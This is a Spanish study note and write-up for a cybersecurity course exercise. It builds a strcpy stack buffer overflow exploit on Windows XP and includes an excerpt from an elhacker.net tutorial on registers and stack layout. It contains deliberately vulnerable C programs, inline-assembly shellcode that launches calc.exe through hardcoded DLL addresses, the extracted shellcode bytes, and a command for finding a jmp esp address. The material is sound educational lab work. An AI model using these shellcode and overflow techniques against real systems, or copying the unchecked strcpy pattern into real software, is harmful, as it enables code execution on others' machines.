# Enunciado
## Introducción


## Objetivo
Crear un programa en [[Lenguaje C|C]] que provoque un [[Desbordamiento de Buffer|desbordamiento de buffer]] sencillo en un entorno de [[Windows XP]] 32 bits, usando la función `strcpy`.

## Instrucciones generales
- Usar [[Lenguaje C|C]] para crear el programa vulnerable.
- Usar un entorno vulnerable [[Windows XP]] (usando por ejemplo, [este](https://github.com/42Cyber/Vagrantfiles/blob/main/WindowsXP_sp3_visual_studio.sh) entorno de [[Vagrant]]).
- Crear un [[Payload|payload]] que use dicho programa para ejecutar el código.

## Entrega
### Fase 1
- [x] Construir un programa en [[Lenguaje C|C]].
- [x] Construir un [[Payload|payload]] que lo use.

### Fase 2
Crear un [[Exploit|exploit]] que permita aprovecharse de esa vulnerabilidad.
- [x] Crear el [[Exploit|exploit]]: un programa `tsunami.exe`, que recibe un parámetro como argumento.
- [x] Crear el [[Payload|payload]]: que abrirá el programa de la Calculadora de Windows XP.
- El [[Payload|payload]] debe contener en [[Shellcode|shellcode]] el código que va a ejecutarse.

> [!info] Construir tu propio [[Payload|payload]] es una parte fundamental de la técnica.
> Documéntate para analizar y entender cómo son los ya existentes, pero procura desarrollar tu propio [[Payload|payload]] y no limitarte a copiar un [[Shell-storm]].

## Bonus
- [ ] Repetir la [[#Fase 1]], pero contra un entorno [[Linux]].
- [ ] Repetir la [[#Fase 2]], pero contra un entorno [[Linux]].


---


# Resolución
## Conceptos a tener en cuenta
- El [[Lenguaje Ensamblador|lenguaje ensamblador]].

## Guía de [[Exploit|exploits]]
- Fuente: [Guía de exploits](https://fundacion-sadosky.github.io/guia-escritura-exploits/buffer-overflow/1-introduccion.html).

## *Write-up*
### Paso 00: Establecer una carpeta compartida
> [!info] Yo usaré una carpeta compartida de [[Vagrant]].

El uso de una carpeta compartida, realmente, no es necesario; sin embargo, hará que el trabajo sea mucho más cómodo y rápido, ya que para la creación y manejo de los archivos vulnerables, de explotación y [[Shellcode|shellcode]], evitará las limitaciones de la [[Máquina Virtual|MV]] pudiendo gestionarlos desde el escritorio local.

![[Windows XP carpeta compartida Vagrant.jpg]]

### Paso 01: Encontrar una vulnerabilidad
Más que encontrarla, se pasa directamente al caso en el que **se comprueba** una vulnerabilidad conocida: [[Desbordamiento de Buffer]].

> [!info] Aquí se explotará haciendo uso de la función `strcpy` del [[Lenguaje C|lenguaje C]].

La vulnerabilidad consiste, principalmente, en **otorgar a una variable un valor superior a la memoria que maneja**; o en otras palabras, asignarle a una variable que maneja $x$ bytes de memoria, un valor de más de $x$ bytes de memoria.

Un ejemplo de código que puede ofrecer una visión de esta vulnerabilidad es el siguiente:
```c
#include <string.h>  
  
int main(int argc, char **argv) {  
    char buffer[64];  
    
    strcpy(buffer, "AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTTUUUUVVVV");
    
    return 0;  
}
```

Se usa la cadena `AAAABBBBCCCC···TTTTUUUUVVVV` para saber dónde se produce el desbordamiento, usando 4 letras repetidas, para medir; es decir, si la salida del error es `46464646`, el desbordamiento se ha producido a partir de la secuencia `GGGG` (porque así es como se presenta la `G` en [[Hexadecima|hexadecimall]]).

> [!example] Resultado.
> - Se introduce la cadena `AAAA···FFFF`.
> - El buffer se desborda al intentar introducir `GGGG ··· VVVV`.

![[WinXP offset Vulnerabilidad.png]]

Tras crear el programa vulnerable y ejecutarlo, se produce el error mencionado. Los detalles muestran el dato necesario, el offset, indicando un valor `52525252`, que hace referencia a `RRRR`.

> [!info] Es decir, el buffer se desborda al introducir `RRRR···VVVV`.

#### Usando [[OllyDBG]]
![[OllyDBG1.png]]
- Crear punto de ruptura con `F2` sobre la línea deseada.
- Ejecutar el código como depuración con `F9`.

### Conclusión
Tras haber verificado esta vulnerabilidad, podemos usarla en un código vulnerable donde se use la función `strcpy`  y al que se le añada un buffer, compuesto por:
1. Un contenido que se desborde (`AAAABBBB···PPPPQQQQQ`).
2. Una dirección de salto a una instrucción deseada.
3. El código de ejecución de dicha instrucción deseada.

Esta parte corresponde al primer punto.


## Paso 02: crear el código que ejecutará la aplicación
Ya que `strcpy` hace uso de la librería *msvcrt.dll* y se quiere ejecutar la calculadora de [[Windows XP]] -identificada como *calc.exe*-, se usará el siguiente código en [[Lenguaje C|C]]:

```c
#include <stdio.h>
#include <windows.h>



int main () {
	
    __asm{
        ; Cargar la libreria 'msvcrt.dll'
        ; LoadLibrary("msvcrt.dll")
		
        push ebp
        mov  ebp, esp
        xor  edi, edi
        push edi
		
        sub  esp, 0Ch                   ; 12, porque son 10 lineas (pero mul.4)
		
        mov byte ptr [ebp-0Bh], 6Dh     ; m
        mov byte ptr [ebp-0Ah], 73h     ; s
        mov byte ptr [ebp-09h], 76h     ; v
        mov byte ptr [ebp-08h], 63h     ; c
        mov byte ptr [ebp-07h], 72h     ; r
        mov byte ptr [ebp-06h], 74h     ; t
        mov byte ptr [ebp-05h], 2Eh     ; .
        mov byte ptr [ebp-04h], 64h     ; d
        mov byte ptr [ebp-03h], 6Ch     ; l
        mov byte ptr [ebp-02h], 6Ch     ; l
		
        lea eax, [ebp-0Bh]              ; Ultima posicion de 'msvcrt.dll'
		
        push eax
        mov ebx,0x7c801d7b              ; Direccion de la libreria 'LoadLibrary'
        call ebx
		
		
        ; Cargar la Calculadora ('calc.exe')
        ; system(calc.exe)
		
        push ebp
        mov  ebp, esp
        xor  edi, edi
        push edi
		
        sub  esp, 08h                   ; 08, porque son 8 lineas (y ya es mul.4)
		
        mov byte ptr [ebp-09h], 63h     ; c
        mov byte ptr [ebp-08h], 61h     ; a
        mov byte ptr [ebp-07h], 6Ch     ; l
        mov byte ptr [ebp-06h], 63h     ; c
        mov byte ptr [ebp-05h], 2Eh     ; .
        mov byte ptr [ebp-04h], 65h     ; e
        mov byte ptr [ebp-03h], 78h     ; x
        mov byte ptr [ebp-02h], 65h     ; e
		
        lea eax, [ebp-09h]              ; Ultima posicion de 'calc.exe'
		
        push eax
        mov  ebx, 0x77c293c7            ; Direccion de la libreria 'system'
        call ebx
    }
}
```
^ecb45c

> [!attention] `windows.h` falla fuera de [[Windows XP]].
> Se necesita compilar y contruir el código del ejecutable **dentro** de [[Windows XP]].
> Usando, por ejemplo, *Visual Studio C++ 6.0*.

Tras construir el ejecutable, se comprueba que este ejecuta la calculadora correctamente.

### Conclusión
Partiendo de lo mencionado anteriormente:
![[#Conclusión]]

Esta parte corresponde al tercer punto.


## Paso 03: extraer el código hexadecimal del ensamblador
Dado el [[tsunami#^ecb45c|código anterior]], se requiere sola y exclusivamente el código ensamblador (contenido de `__asm{}`) para el [[Shellcode|shellcode]], por lo que usando Visual Studio C++ 6.0 desde [[Windows XP]], al contr

Usando el comando `xxd -i codigo.c > codigo.hex` (siendo [[tsunami#^ecb45c|este código]] el argumento), se obtiene:

```
unsigned char asm_obj[] = {
  0x4c, 0x01, 0x05, 0x00, 0xfe, 0x59, 0xf1, 0x62, 0x5a, 0x24, 0x00, 0x00,
  0x1c, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x2e, 0x64, 0x72, 0x65,
  0x63, 0x74, 0x76, 0x65, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x62, 0x00, 0x00, 0x00, 0xdc, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x0a, 0x10, 0x00,
  0x2e, 0x64, 0x65, 0x62, 0x75, 0x67, 0x24, 0x53, 0x00, 0x00, 0x00, 0x00,
  0x00, 0x00, 0x00, 0x00, 0xeb, 0x20, 0x00, 0x00, 0x3e, 0x01, 0x00, 0x00,
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x48, 0x00, 0x10, 0x42, 0x2e, 0x74, 0x65, 0x78, 0x74, 0x00, 0x00, 0x00,
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x99, 0x00, 0x00, 0x00,
  
  .
  .  Se ha omitido parte del código para no ocupar demasiado espacio.
  .
  
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x2e, 0x64, 0x65, 0x62, 0x75, 0x67,
  0x24, 0x53, 0x00, 0x00, 0x00, 0x00, 0x04, 0x00, 0x00, 0x00, 0x03, 0x02,
  0x4e, 0x00, 0x00, 0x00, 0x02, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x03, 0x00, 0x05, 0x00, 0x00, 0x00, 0x73, 0xbf, 0xd2, 0x13, 0x00, 0x00,
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x2e, 0x64, 0x65, 0x62, 0x75, 0x67, 0x24, 0x54, 0x00, 0x00, 0x00, 0x00,
  0x05, 0x00, 0x00, 0x00, 0x03, 0x02, 0x48, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x04, 0x00, 0x00, 0x00
};
unsigned int asm_obj_len = 9814;
```
^045f11

> [!attention] El texto original de `codigo.hex` mide poco más de 800 líneas.
> Se ha quitado parte del relleno para la representación.

Este código es una traducción literal de todo el contenido del [[tsunami#^ecb45c|código anterior]], pero solo es necesario el contenido de `__asm{}`, por lo que será necesario:
1. Averiguar cuándo empieza el código [[Lenguaje Ensamblador|ensamblador]].
2. Extraer todo ese código y transformarlo a Byte.

### Extraer el código [[Lenguaje Ensamblador|ensamblador]]
Se sabe que `push ebp` -la primera línea del código [[Lenguaje Ensamblador|ensamblador]] (del [[tsunami#^ecb45c|código anterior]])- se traduce como `0x55, 0x8b`, por lo que se busca dicha cadena y se extrae visualizando el contenido del [[tsunami#^045f11|fichero anterior]].

Esas direcciones se pueden obtener a través del comando `objdump` de [[Linux]], a través de la carpeta compartida de [[Vagrant]] de la [[Máquina Virtual|máquina virtual]]. Usando dicho comando se puede observar dichas direcciones y una vez encontradas, filtrarlas en el [[tsunami#^045f11|fichero hexadecimal]] obtenido en la sección anterior.

Una vez filtrado el contenido, se obtiene un resultado parecido al siguiente:

```
                                                      0x55, 0x8b, 0xec,
0x33, 0xff, 0x57, 0x83, 0xec, 0x0c, 0xc6, 0x45, 0xf5, 0x6d, 0xc6, 0x45,
0xf6, 0x73, 0xc6, 0x45, 0xf7, 0x76, 0xc6, 0x45, 0xf8, 0x63, 0xc6, 0x45,
0xf9, 0x72, 0xc6, 0x45, 0xfa, 0x74, 0xc6, 0x45, 0xfb, 0x2e, 0xc6, 0x45,
0xfc, 0x64, 0xc6, 0x45, 0xfd, 0x6c, 0xc6, 0x45, 0xfe, 0x6c, 0x8d, 0x45,
0xf5, 0x50, 0xbb, 0x7b, 0x1d, 0x80, 0x7c, 0xff, 0xd3,
                                                      0x55, 0x8b, 0xec,
0x33, 0xff, 0x57, 0x83, 0xec, 0x08, 0xc6, 0x45, 0xf7, 0x63, 0xc6, 0x45,
0xf8, 0x61, 0xc6, 0x45, 0xf9, 0x6c, 0xc6, 0x45, 0xfa, 0x63, 0xc6, 0x45,
0xfb, 0x2e, 0xc6, 0x45, 0xfc, 0x65, 0xc6, 0x45, 0xfd, 0x78, 0xc6, 0x45,
0xfe, 0x65, 0x8d, 0x45, 0xf7, 0x50, 0xbb, 0xc7, 0x93, 0xc2, 0x77, 0xff,
0xd3
```

Este es el código de la [[Shellcode|shellcode]], pero previamente debe transformarse a Byte.

#### Transformar el código a Byte
1. Se cambian los `0x` por `\x`.
2. Se eliminan los espacios y saltos de línea.

```
                                    \x55\x8b\xec
\x33\xff\x57\x83\xec\x0c\xc6\x45\xf5\x6d\xc6\x45
\xf6\x73\xc6\x45\xf7\x76\xc6\x45\xf8\x63\xc6\x45
\xf9\x72\xc6\x45\xfa\x74\xc6\x45\xfb\x2e\xc6\x45
\xfc\x64\xc6\x45\xfd\x6c\xc6\x45\xfe\x6c\x8d\x45
\xf5\x50\xbb\x7b\x1d\x80\x7c\xff\xd3
                                    \x55\x8b\xec
\x33\xff\x57\x83\xec\x08\xc6\x45\xf7\x63\xc6\x45
\xf8\x61\xc6\x45\xf9\x6c\xc6\x45\xfa\x63\xc6\x45
\xfb\x2e\xc6\x45\xfc\x65\xc6\x45\xfd\x78\xc6\x45
\xfe\x65\x8d\x45\xf7\x50\xbb\xc7\x93\xc2\x77\xff
\xd3
```


## Paso 04: dirección de salto `jmp esp`

Usando el programa `findjump.exe`, puede obtenerse la dirección de salto necesaria para el offset: `0x7c86467b`.

```shell
findjump.exe kernel32.dll ESP
```


# Blog *El Hacker*
- Fuente: [elhacker.net](https://wiki.elhacker.net/bugs-y-exploits/overflows-y-shellcodes/exploits-y-stack-overflows-en-windows)

## Teoría
### [[Lenguaje C|C]]/[[Lenguaje C++|C++]]
Lenguaje de programación muy extendido, multiplataforma, y fácil.

Se trata de la base de nuestros sistemas operativos(salvo cosas en ensamblador como rutinas de boot) y es tremendamente potente y optimizado. Sus archivos básicos son `*.c` y `*.cpp` (para los [[Lenguaje C++|C++]]).

> [!abstract] El lenguaje más recomendable para aprender, el más útil.

### [[Lenguaje Ensamblador|Ensamblador]] (Assembler)
El lenguaje más "básico" que permite al programador interactuar con el [[CPU]].

Las instrucciones en [[Lenguaje Ensamblador|ASM]] se pasan a binario, que es lo que "entiende" la [[CPU]], es decir, `1` y `0`.

> [!info] Se agrupan en cadenas hexadecimales para mayor claridad.

Realmente, un compilador [[Lenguaje Ensamblador|ASM]] lo único que hace es calcularte las etiquetas, los saltos y los calls, y "encapsular" el ejecutable. Todos los lenguajes de programación, a la hora de compilar (obviamente, los lenguajes de script no), convierten su código en instrucciones [[Lenguaje Ensamblador|ASM]].

- Instrucciones en [[Lenguaje Ensamblador|ASM]] ([[Intel]]) son por ejemplo: `mov`, `push`, `pop`, etc...
- Instrucciones en [[Lenguaje Ensamblador|ASM]] ([[AT&T]]) son por ejemplo: `popl`, `movl`, `pushl`, etc...

Se trata de un lenguaje de programación **difícil de aprender**, solo para **cosas puntuales** o que requieran una **gran optimización**, pero saberlo te dará muchas alegrías :)

> [!info] Cualquier informático debería poder entender y dominar las instrucciones básicas.

### [[Depurador]] (Debugger)
Un debugger es un programa que permite ir "paso a paso", instrucción a instrucción a otro programa.

Al ir instrucción a instrucción, podemos ver completamente que esta pasando, los registros, la memoria, etc, así como muchas mas funciones muy interesantes. Su función principal es la de auditar código, y ver el porque falla (o simplemente porque no realiza lo que queremos que haga), es una herramienta imprescindible para cualquier programador. Lo que pasa que
también puede servir para otras cosas :)

### [[Desamblador]] (Dissasembler)
Un desamblador es un programa que te muestra el código de un programa, una dll,
lo que sea que este hecho de código que el desamblador entienda.

Normalmente, te muestra su código en [[Lenguaje Ensamblador|ASM]] (por ejemplo, un programa codeado en [[C]], te muestra la conversión de dichas instrucciones [[C]] en [[Lenguaje Ensamblador|ASM]]), aunque hay desambladores que permiten ver su código (o parte de el) de programas hechos en [[Java]] o VBasic, por ejemplo.

Normalmente, debugger y dissasembler van en el mismo programa, los mas usados son el Ollydbg (el que usare aquí), Softice, IDA, Win32dasm...

### Editor Hexadecimal (Hex Editor)
No hay que confundir un [[Desamblador|desamblador]] con un hex editor.

El primero te muestra el código de un programa, el hex editor simplemente te muestra el contenido de un archivo, del tipo que sea, como un dumpeo hexadecimal y/o [[Binario|binario]], así como la posibilidad de modificar y guardar dicho archivo.

Se usa para rastrear y modificar archivos que usan programas, tanto para fines "de programación" (el porque al cargar el archivo falla, el porque no se escribe bien, etc...) como de "hacking" o "cracking".

> [!cite] A mi, personalmente, me gusta mucho el Hackman, pero se que hay mucho mejores :P
> Cuestión de buscar.

### [[CPU]] (microprocesador)
> [!info] La CPU es el ❤️ de un ordenador.

Se trata de la unidad de hardware encargada de ejecutar las instrucciones de un programa o sistema operativo, instrucción a instrucción, que estén en una determinada área de memoria. Se ayuda de registros donde almacena variables, datos o direcciones.

Una explicación completa sobre el tema, requeriría uno o varios libros, aunque googleando se encuentra muchísima información.

### [[Registro|Registros]] de la [[CPU]]
La [[CPU]] contiene una serie de registros, donde almacena variables, datos o direcciones de las operaciones que esta realizando en este momento.

El lenguaje [[Lenguaje Ensamblador|ASM]] se sirve de dichos registros como variables de los programas y rutinas, haciendo posible cualquier programa (de longitudes considerables, claro).

Los más interesantes son:

#### [[Extended Instruction Pointer]] (EIP)
> [!info] Definición
> Este registro siempre apunta a la **siguiente** dirección de memoria que el procesador **debe ejecutar**.

La [[CPU]] se basa en secuencias de instrucciones, una detrás de la otra, salvo que dicha instrucción requiera un salto, una llamada...al producirse por ejemplo un "salto", EIP apuntara al valor del salto, ejecutando las instrucciones en la dirección que especificaba el salto.

Si logramos que EIP contenga la dirección de memoria que queramos, podremos controlar la ejecución del programa, si también controlamos lo que haya en esa dirección.

#### EAX, EBX... ESI, EDI...
Son registros multipropósito para usarlo según el programa, se pueden usar de cualquier forma y para alojar cualquier dirección, variable o valor, aunque cada uno tiene funciones "especificas" según las instrucciones [[Lenguaje Ensamblador|ASM]] del programa:

- **EAX**: registro acumulador.
	Cualquier instrucción de retorno, almacenara dicho valor en EAX. También se usa para sumar valores a otros registros en funciones de suma, etc....  
  
- **EBX**: registro base.
	Se usa como "manejador" o "handler" de ficheros, de direcciones de memoria (para luego sumarles un offset) etc...

- **ECX**: registro contador.
	Se usa, por ejemplo, en instrucciones ASM loop como contador, cuando ECX llega a cero, el loop se acaba.

- **EDX**: registro dirección o puntero.
	Se usa para referenciar a direcciones de memoria mas el offset, combinado con registros de segmento (CS, SS, etc..)
 ^712679
- **ESI** y **EDI**: registros análogos a [[tsunami#^712679|EDX]].
	Se pueden usar para guardar direcciones de memoria, offsets, etc..

#### CS, SS, ES y DS
Son registros de segmento, suelen apuntar a una cierta sección de la memoria.

Se suelen usar Registro+Offset para direccionar a una dirección concreta de memoria.

Los mas usados son:
- **CS**, que apunta al segmento actual de direcciones que esta ejecutando EIP
- **SS**, que apunta a la pila y DS, que apunta al segmento de datos actual.

Es es "multipropósito", para lo mismo, referenciar direcciones de memoria, y un largo etc...

#### ESP y EBP
Extended Stack Pointer y Extender Base Pointer.

> [!cite] Ambos los veremos más en profundidad cuando explique la pila.

Sirven para manejar la pila, referenciando la "cima" (ESP) y la "base" (EBP).

- **ESP**: apunta al inicio de la pila que esta usando el programa o hilo en ese momento.
	Cada programa usara un espacio de la pila distinto, y cada hilo del programa también.

- **EBP**: apunta al final de la pila de ese programa o hilo.

### ¿Qué es una Vulnerabilidad?
#todo: completar con InfoSec.

### ¿Qué es un Exploit?
#todo: completar con InfoSec.

### ¿Qué es una Shellcode?
#todo: completar con InfoSec.

### ¿Qué es un overflow?
Un overflow es, básicamente, cuando resguardamos espacio de memoria insuficiente para una variable (allocate), y le introducimos más datos a dicha variable de los que puede soportar.

La variable "desborda", y los datos que no caben sobrescriben memoria continua a dicha variable. Si declaramos una variable que solo debe soportar 8 bytes, si le movemos 10 bytes, los 2 bytes restantes no se pierden, sino que sobrescriben la memoria contigua a dicha variable.

Hay distintos tipos de overflow, stack overflow (el que veremos aquí, también llamado buffer overflow, o desbordamiento de buffer, etc...), heap overflow (ya lo veremos en algún otro texto, se refiere a desbordar una variable declarada en el heap en vez de en la pila...), format string overflow (bugs de formato de las cadenas de texto), integer overflow (debidos a declaraciones de variables con un espacio mínimo o negativo que proveemos nosotros...), etc...

#### ¿Por qué se llama [[Desbordamiento de Buffer|Stack Overflow]]?
La [[Pila|pila]] (stack) es una estructura tipo [[LIFO]] (*Last In, First Out*).

Bien, pues el SO (tanto [[Windows]] como [[Linux]], como [[MacOS]]) se basa en una pila para manejar las variables locales de un programa, los retornos (rets) de las llamadas a una función (calls), las estructuras de excepciones (SEH, en [[Windows]]), argumentos, variables de entorno, etc...

> [!example] Se quiere llamar a una función de 2 argumentos.
> 1. Se mete el *argumento 2* en la pila del sistema.
> 2. Se mete el *argumento 1* en la pila del sistema.
> 3. Se llama a la *función*.

Una "llamada" a una función o dirección de memoria, se hace con la instrucción `Call` de [[Lenguaje Ensamblador|ASM]].
- `Call <dirección>`: llamar a la dirección de memoria.
- `Call <registro>`: llamar a lo que contenga ese registro.

El registro EIP recoge dicha dirección, y la siguiente instrucción a ejecutar esta en dicha dirección, hemos "saltado" a esa dirección; pero antes, el sistema debe saber que hacer cuando termine la función, por donde debe seguir ejecutando código.

El programa puede llamara  la función suma, pero con el resultado, hacer una multiplicación, o simplemente mostrarlo por pantalla. Es decir, la CPU debe saber por donde seguir la ejecución una vez terminada la función suma.

> [!info] Para eso sirve la pila.

Justo al ejecutar el call, se GUARDA la dirección de la siguiente instrucción en la pila. Esa instrucción se denomina normalmente RET o RET ADDRESS, dirección de "retorno" al programa principal (o a lo que sea).

Entonces, el call se ejecuta, se guarda la dirección, coge los argumentos de la suma, se produce la suma y, como esta guardada la dirección por donde iba el programa, VUELVE (RETORNA) a la dirección de memoria que había guardada en la pila (el ret), es decir, a la dirección siguiente del `call`.

##### Explicación por pasos
1. Llegamos al call. EIP apunta a la instrucción call.
2. Se ejecuta el call. EIP apunta a la instrucción del call, es decir, donde debemos ir.
3. Se guarda la siguiente instrucción después del call en la pila (el ret).

En ese momento, la pila esta así:
```
ESP            | RET ADDRESS |   EBP -8 bytes
ESP +4 bytes   | argumento 1 |   EBP -4 bytes
ESP +8 bytes   | argumento 2 |   <--- EBP apunta aquí (la base de la pila)
```

4. La cpu ejecuta la/las instrucciones dentro de la función suma (obviamente, dentro de la función suma se usara la pila para almacenar datos y demás...).
5. La función suma alcanza la instrucción RETN (retorno), y EIP recoge la dirección RET ADDRESS, y vuelve al programa principal, justo después del call suma.

Espero que se entienda, es muy importante, ya que un [[Desbordamiento de Buffer|desbordamiento de buffer]] significa introducir suficientes datos en la pila, hasta poder sobrescribir dicho ret address, pero eso lo veremos mas adelante.

Imaginaos que al hacer ese call, dentro de la función suma necesitamos un espacio para alojar por ejemplo, el resultado, o uno de los operandos, lo que sea.

Bien, cuando el programa o el [[Sistema Operativo|SO]] piden "espacio" para alojar una(s) variable(s), un dato, un nombre o lo que sea, dicho nombre normalmente se guarda en la pila (no entraremos en temas de heap).

Básicamente, lo que se hace es crear un "espacio" entre un nuevo ESP y EBP (cima y base de la pila) para alojar las variables. Son "nuevos" para no sobrescribir los variables y valores que ya haya en la pila, de otras funciones o programas.

Posteriormente, se introduce el EBP antiguo en la pila (se pushea), para saber DONDE estaba la anterior base de la pila, la pila del proceso principal. Esto también es importante, es el EBP salvado del proceso anterior. Cuando la función suma acabe, EBP tomara el valor del EBP salvado, y estaremos otra vez en el "trozo" de pila del proceso principal.

Ahora mismo, la pila esta así:
```
ESP             | EBP anterior salvado |   EBP - 4
ESP +4  bytes   | RET ADDRESS          |   <---- El EBP actual apunta aquí
ESP +8  bytes   | argumento 1 de suma  |   EBP +4
ESP +12 bytes   | argumento 2 de suma  |   EBP + 8
```

Tras esto, se "sustrae", se "resta" a ESP tantos bytes como necesitemos de espacio para nuestra variable. Al sustraerle bytes, la diferencia entre ESP y EBP son esos bytes, donde irán nuestros datos (nombre, datos, lo que sea). Por ejemplo, si nuestra variable "nombre", necesita 12 bytes (siempre se hace con múltiplos de 4, por temas de alineamiento en la pila), pues se le sustrae a ESP 12 bytes:

```
ESP       | basura, aun no hay nada inicializado |   EBP -16 
ESP +4    | basura                               |   EBP -12  
ESP +8    | basura                               |   EBP -8
ESP +12   | EBP anterior salvado                 |   EBP -4
ESP +16   | RET ADDRESS                          |   EBP (el EBP no cambia)
ESP +20   | argumento 1 de suma                  |   EBP +4
ESP +24   | argumento 2 de suma                  |   EBP +8              
```

Como se ve, hay 4+4+4 bytes de basura (basura quiere decir que son datos que había antes ahí, de anteriores usos de la pila, pero que no nos sirven) para nuestro nombre o lo que sea, de 12 bytes.

Pero, si esos bytes no son suficientes, al introducir nuestro nombre por ejemplo, si solo tenemos espacio para 12 bytes (12 caracteres), y introducimos 14, los 2 bytes que sobran, sobrescribirán la memoria contigua a la declarada en la variable, es decir, sobrescribirán el EBP de la anterior función, si metemos 4 lo sobrescribiremos completamente:

Introducimos AAA...A  (16 As) para ver que pasa (esto no se haría con push, que
aumentan ESP, sino con instrucciones MOV):
```
ESP       | AAAA                                    |   EBP -16 
ESP +4    | AAAA                                    |   EBP -12  
ESP +8    | AAAA                                    |   EBP -8
ESP +12   | (EBP anterior salvado sobrescrito) AAAA |   EBP -4
ESP +16   | RET ADDRESS                             |   EBP
ESP +20   | argumento 1 de suma                     |   EBP +4
ESP +24   | argumento 2 de suma                     |   EBP +8
```

Y si le metemos otras 4 (AAAA), sobrescribiremos el ret, que es lo que nos interesa.


## Práctica
Sea el siguiente código vulnerable:
```C
/* vuln1.c por Rojodos */

#include <stdio.h>  // Librería con funciones básicas de Entrada/Salida

int main (int argc, char **argv) {  // La función "principal" del programa función
    char buffer[64];    //Declaramos un array con 64 bytes de espacio
    
    if (argc < 2){  // Si los argumentos son menores que 2...
        printf ("Introduzca un argumento al programa\n");
		
        return 0;   // Retornamos 0 a la función main, y el programa acaba
    }
    
    strcpy (buffer, argv[1]);   // Aqui es donde esta el fallo.
	
    return 0;  // Devolvemos 0 a main, y el programa acaba.
}
```

> [!error] El fallo está en la función `strcpy`.

Esa función copiara lo que hayamos metido por argumentos al programa (`argv[1]`) dentro de la variable `buffer`; pero `buffer` solo tiene espacio para 64 caracteres, no hay ningún chequeo de tamaño de la fuente (eso se hace por ejemplo, con la función mas segura `strncpy`), y por
argumentos al programa le podemos meter lo que queramos.

Si lo compilamos (con cualquier compilador [[Lenguaje C|C]]/[[Lenguaje C++|C++]] en [[Windows]], recomiendo Dev Cpp o Visual C++), generamos el archivo `vuln1.exe`.

Al ejecutarlo en una consola [[MSDOS]] así:
```
F:\Rojodos\manual exploits>vuln1 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA...
```
- Debe haber más de 64 `A`.

> [!info] Saldrá la típica ventana: "`vuln1.exe` ha detectado un problema y debe cerrarse".
> Pinchando "Para ver los datos de los errores, haga click aquí", se observa el mensaje:
> 
> "Offset:41414141"
> 
> `0x41` es la letra A representada en [[Hexadecimal|hexadecimal]] (consultable en esta [tabla](www.asciitable.com)); es decir, hemos sobrescrito la dirección de retorno de `main()` con `AAAA` (`0x41414141` en [[Hexadecimal|hexadecimal]]).
> 
> No la de `strcpy`, pues la dirección de `strcpy` va *antes* de la variable `buffer` en la pila, ya que primero se declara `buffer`, y luego se llama a `strcpy`, con lo que la variable `buffer` está *debajo*, en direcciones mas altas, de `strcpy` en la pila.

Esto lo podemos ver mucho mejor en un debugger, como el Ollydbg (en www.elhacker.net lo encontraras fácilmente, o en su pagina principal, googlead un poco).

Usar un debugger, y mas el olly, es realmente fácil, no tiene ningún misterio. Si alguien se cree que es una herramienta para "elites" y súper difícil de usar, esta completamente equivocado.

Bien, con el olly, cargamos el programa (File -> Open -> vuln1.exe). Veréis que
salen un montón de instrucciones en la ventana principal, con la dirección
relativa de código inicial de 00401000. Esta dirección es la dirección base del
ejecutable en memoria (00400000, el 99% de los ejecutables se carga en esa
dirección) mas el offset señalado en el PE header, que indica donde empieza el
código (entry point, en este caso el offset es +1000h).

También deberíais ver a vuestra derecha, el estado de los registros de la CPU,
EAX, EBX...ESI, EDI, EBP, ESP y EIP, y los valores que contienen. Abajo a la
izquierda, deberíais ver el dumpeo en hexadecimal, cosa que no usaremos, y abajo
a la derecha, la pila (stack). Ahí tenéis que tener la vista casi fija :)

Una vez cargado el ejecutable (se os abrirá una ventanita de MS-DOS, pero que no
sale nada, no os preocupéis, el programa esta cargado en memoria, pero no se
esta ejecutando aun),le metemos los argumentos (copiamos todas las AAAs
que hay mas arriba en el texto, y nos vamos a Debug -> Arguments, y las copiamos
ahí). Os dirá que tenemos que resetear el programa para que los argumentos
tengan efecto (nos vamos a Debug-> Restart). Y listo :)

Le damos a RUN (Debug -> Run ó F9) y....

